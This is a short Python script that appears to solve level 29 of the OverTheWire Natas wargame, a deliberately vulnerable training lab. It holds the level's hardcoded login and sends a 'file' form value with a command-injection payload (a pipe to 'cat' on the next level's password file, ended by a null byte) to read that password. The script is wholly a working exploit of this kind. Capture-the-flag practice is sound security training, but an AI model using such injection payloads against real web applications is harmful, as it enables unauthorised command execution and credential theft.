import sys
import requests as req

username = "natas29"
password = "pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno"
url = "http://%s.natas.labs.overthewire.org/" % username

s = req.session()

def get(s):
	r = s.get(url, auth=(username, password))
	return r

def post(s, data):
	r = s.post(url, auth=(username, password), data=data)
	return r

if __name__ == "__main__":
	data = {"file": "| cat /etc/nata*_webpass/nata*30 \0"}
	r = post(s, data)
	print(r.text)
